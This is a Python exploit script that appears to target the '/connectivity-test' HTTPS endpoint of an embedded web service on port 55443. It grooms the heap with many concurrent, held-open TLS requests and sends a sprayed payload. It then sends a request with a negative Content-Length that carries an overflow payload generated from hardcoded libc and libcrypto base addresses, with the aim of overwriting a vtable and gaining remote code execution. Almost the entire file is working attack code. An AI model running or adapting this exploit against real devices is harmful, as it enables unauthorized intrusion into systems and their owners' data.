#!/bin/env python
"""
A simple example of using Python sockets for a client HTTPS connection.
"""
import time
import ssl
import socket
import os
import threading
import datetime
from optparse import OptionParser
import multiprocessing
import signal
import time
import thread
from pwn import *
from echorce import *
import threading 

host1 = '10.0.0.173'

signal_X1_goThrough = 0
signal_X2_goThrough = 0
signal_Y1_goThrough = 0
signal_Y2_goThrough = 0
signal_Z_goThrough = 0
signal_O_goThrough = 0

signal_O_stage1 = 0
signal_O_stage2 = 0
signal_Z_stage1 = 0
signal_Z_stage2 = 0
signal_Z2_stage1 = 0
signal_Z2_stage2 = 0


libc_base = 0xf76cd000
libcrypto_base = 0xf750c000

if len(sys.argv) > 2:
    print 'start to set libc_base and libcrypto address\n'
    libc_base = int(sys.argv[1], 16)
    libcrypto_base = int(sys.argv[2], 16)

# generate echorce payload
spray_payload, overflow_payload = gen_echo_rce_payload(libc_base, libcrypto_base)


lock = threading.Lock()

class counter(object):
    def __init__(self, c):
        self.c = c
    def inc(self):
        lock.acquire()
        new = self.c + 1
        self.c = new
        lock.release()

xChunkCounter = counter(0)
xSeqFreeCounter = counter(0)
xZCounter = counter(0)
xZCounter2 = counter(0)

X1Freed = 0
X2Freed = 0
Y1Freed = 0
Y2Freed = 0

# for AAA test
# XL_data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
#              "Host: " + host1 + "\r\n" + 
#              "Content-Length: 15728640\r\n\r\n" +
#              'A'*7000000+"\r\n\r\n")

XL_data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             #"Content-Length: 15728640\r\n\r\n" +
             "Content-Length: 1572855\r\n\r\n" + #1.5 MB (1572864)- 9 Bytes
             spray_payload + "\r\n\r\n")

def chunkExLargeX():
    global XL_data_to_send
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
    print("[CHUNK] X-Large created. (15728640)\r\n")

    s.sendall(XL_data_to_send)
    #time.sleep(500)
    #s.send("\r\n\r\n");
    xChunkCounter.inc()
    print("[CHUNK] X-Large finished. (15728640)\r\n")
    time.sleep(500)
    s.close()

	
def chunkSuperLargeX():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 1310720\r\n\r\n" +
             "\0\0\0\0"+"AAAA"*200000+"\r\n\r\n")
    print("[CHUNK] SuperLarge created. (1310720)\r\n")
    s.send(data_to_send)
    #time.sleep(500)
    #s.send("\r\n\r\n");
    print("[CHUNK] SuperLarge finished. (1310720)\r\n")
    s.close()

def chunkSuperLargeH():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 1310720\r\n\r\n" +
             "\0\0\0\0"+"AAAA"*200000+"\r\n\r\n")
    s.send(data_to_send)
    print("[CHUNK] SuperLarge create halted. (1310720)\r\n")
    time.sleep(500)
    print("[CHUNK] SuperLarge finished. (1310720)\r\n")
    s.close()

def chunkW():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 21\r\n\r\naa")
    s.send(data_to_send)
    print("[CHUNK] W create halted. (21)\r\n")
    time.sleep(500)
    #s.send("aa\r\n\r\n");
    print("[CHUNK] W finished. (21)\r\n")

    s.close()

def chunkX():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 6\r\n\r\naa")
    s.send(data_to_send)
    print("[CHUNK] X create halted. (6)\r\n")

    # s.send("aa\r\n\r\n");
    time.sleep(500)
    print("[CHUNK] X finished. (6)\r\n")

    s.close()

def chunkX1():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 6\r\n\r\naa")
    s.send(data_to_send)
    print("[CHUNK] X-1 create halted. (6)\r\n")
    global signal_X1_goThrough, X1Freed

    while(signal_X1_goThrough == 0):
        time.sleep(0.1)
    X1Freed = 1
    print("[CHUNK] X-1 finished. (6)\r\n")

    s.send("\r\n\r\n");

    s.close()

def chunkX2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 6\r\n\r\naa")
    s.send(data_to_send)
    print("[CHUNK] X-2 create halted. (6)\r\n")
    global signal_X2_goThrough, X2Freed
    while(signal_X2_goThrough == 0):
        time.sleep(0.1)
    X2Freed = 1
    print("[CHUNK] X-2 finished. (6)\r\n")

    s.send("\r\n\r\n");

    s.close()

def chunkY():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 500 \r\n\r\naa")
    s.send(data_to_send)
    print("[CHUNK] Y create halted. (500)\r\n")

    time.sleep(500)
    print("[CHUNK] Y finished. (500)\r\n")

    s.send("\r\n\r\n");

    s.close()

def chunkY1():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 500 \r\n\r\naa")
    s.send(data_to_send)
    print("[CHUNK] Y-1 create halted. (500)\r\n")

    while(signal_Y1_goThrough == 0):
        time.sleep(0.1)
    Y1Freed = 1
    print("[CHUNK] Y-1 finished. (500)\r\n")

    s.send("\r\n\r\n");

    s.close()

def chunkY2():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 500 \r\n\r\naa")
    s.send(data_to_send)
    print("[CHUNK] Y-2 create halted. (500)\r\n")
    global signal_Y2_goThrough

    while(signal_Y2_goThrough == 0):
        time.sleep(0.1)

    Y2Freed = 1
    print("[CHUNK] Y-2 finished. (500)\r\n")

    s.send("\r\n\r\n");

    s.close()


def chunkZ():
    sz = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sz.connect((host1, 55443))
    sz = ssl.wrap_socket(sz, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test?cmd=throughputTestFetchData HTTP/1.8\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 0")
    sz.send(data_to_send)

    global signal_Z_stage1, signal_Z_stage2
    signal_Z_stage1 = 1
    print("[CHUNK] Z create halted. (0)\r\n")
    xZCounter.inc()
    global signal_Z_goThrough, signal_O_goThrough
    while(signal_Z_goThrough == 0):
        time.sleep(0.1)
    signal_Z_stage2 = 1
    # Resume O
    signal_O_goThrough = 1

    sz.send("\r\n\r\n");

    xZCounter.inc()
    print("[CHUNK] Z finished. (0)\r\n")

    #we dont want to trigger mg_read (ssl_read) now so comment this.
    #while True:
    #    new = sz.recv(16)
    #    if not new:
    #      sz.close()
    #      break
    time.sleep(10)
    print("[CHUNK] Z disconnected. (0)\r\n")
    sz.close()


def chunkZ2():
    sz = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sz.connect((host1, 55443))
    sz = ssl.wrap_socket(sz, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test?cmd=throughputTestFetchData HTTP/1.8\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: 0")
    sz.send(data_to_send)

    global signal_Z2_stage1, signal_Z2_stage2
    signal_Z2_stage1 = 1
    print("[CHUNK] Z2create halted. (0)\r\n")
    xZCounter2.inc()
    global signal_Z2_goThrough;
    while(signal_Z_goThrough == 0):
        time.sleep(0.1)
    signal_Z2_stage2 = 1
    sz.send("\r\n\r\n");
    xZCounter2.inc()
    print("[CHUNK] Z2 finished. (0)\r\n")

    #we dont want to trigger mg_read (ssl_read) now so comment this.
    #while True:
    #    new = sz.recv(16)
    #    if not new:
    #      sz.close()
    #      break
    time.sleep(10)
    print("[CHUNK] Z2 disconnected. (0)\r\n")
    sz.close()

def chunkO():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host1, 55443))
    s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)

    data_to_send=("POST /connectivity-test HTTP/1.1\r\n" + 
             "Host: " + host1 + "\r\n" + 
             "Content-Length: -1")
    print("[CHUNK] O partly sent (halted). (OVERFLOW)\r\n")
    global signal_O_stage1, signal_O_stage2

    s.send(data_to_send)
    signal_O_stage1 = 1
    #rest = "\r\n\r\n" + (p32(0xee700000)*140000) + "\r\n\r\n"
    rest = "\r\n\r\n?XX&cmd=" + overflow_payload + "\r\n\r\n"
    if(xZCounter.c == 0):
        time.sleep(1) #Z shall go first
    s.send(rest)
    signal_O_stage2 = 1
    print("[CHUNK] O sent & finished (Keeping alive). (OVERFLOW)\r\n")

   # time.sleep(500)
    print("[CHUNK] O finally done. (OVERFLOW)\r\n")
    #while True:
    #    new = s.recv(1)
    #    time.sleep(1)
    time.sleep(10)
    print("[CHUNK] O finally exited. (OVERFLOW)\r\n")
    s.close()

###############################################################################
# Stage 1.
print("------------------Stage 1------------------\r\n")

# Things must go in order!

# Create SuperLarge nope
# Create X-Large, so ~0xee70000 is fixed
xl = 0

for xl in range(0, 5):
    thread.start_new_thread(chunkExLargeX, ())
    time.sleep(1)

i = 0
#for i in range(0, 10):

timelimit = 180
while(xChunkCounter.c < xl + 1):  # xl will eqv. to finished threads.
    if(timelimit):
        timelimit = timelimit - 1
    else:
        os._exit(0) #timeout
    time.sleep(1)
    #print("Still waiting... (%d of %d finished)\r\n" % (xChunkCounter.c, xl + 1))



'''
thread.start_new_thread(chunkSuperLarge, ())

time.sleep(1)
'''


# Create W
thread.start_new_thread(chunkW, ())

time.sleep(0.31)

# Create W
thread.start_new_thread(chunkW, ())

time.sleep(0.31)

# Create Y
thread.start_new_thread(chunkY, ())

time.sleep(0.31)


# Stage 2.
print("------------------Stage 2------------------\r\n")

# Create X1
thread.start_new_thread(chunkX1, ())

time.sleep(0.31)

# Create Y1
thread.start_new_thread(chunkY1, ())

time.sleep(0.31)

# Create X2
thread.start_new_thread(chunkX2, ())

time.sleep(0.31)


# Create Y2
thread.start_new_thread(chunkY2, ())

time.sleep(0.31)


# Stage 3.
print("------------------Stage 3------------------\r\n")
# Free Y2
print("Freeing Y2 \r\n")
signal_Y2_goThrough = 1

#while (Y2Freed == 0):
#    print("Still waiting for Y2 to be freed...\r\n")
#    time.sleep(1)

# Create Z halted
thread.start_new_thread(chunkZ, ())

#thread.start_new_thread(chunkZ2, ())

#time.sleep(1)
while (xZCounter.c == 0):
    if(timelimit):
        timelimit = timelimit - 1
    else:
        os._exit(0) #timeout
    print("Still waiting for Z to be allocated...\r\n")
    time.sleep(1)

# Free X1
print("Freeing X1 \r\n")
signal_X1_goThrough = 1

# Free X2
print("Freeing X2 \r\n")
signal_X2_goThrough = 1

while (X1Freed == 0 or X2Freed == 0):
    print("Still waiting for X1 & X2 to be freed...\r\n")
    time.sleep(1)

### 
# Create X
thread.start_new_thread(chunkX, ())

time.sleep(1)

# Create X
thread.start_new_thread(chunkX, ())

time.sleep(1)

#while (signal_Z_stage1 == 0): # or signal_Z2_stage1 == 0):
#    print("Still waiting for Z block to finish 1st stage...")
#    time.sleep(1)

# Create O 
thread.start_new_thread(chunkO, ())  

#while (signal_O_stage1 == 0):
#    print("Still waiting for O block to finish 1st stage...")
#    time.sleep(1)
###  
print("Before the overflow request\r\n")
signal_Z_goThrough = 1


# Wait till the buffer overflow actually overwrites
# the virtual table of Z, 1.5s plus 1s (Z's react time) 
# might be okay but who knows.

#print("So we will resume chunk Z\r\n")
while(xZCounter.c != 2):
    sleep(0.01)
# Resume O
#signal_O_goThrough = 1
print("Everything's done. Go check the result.\r\n")

# We don't exit or everything is broken 
time.sleep(3)
exit(1)
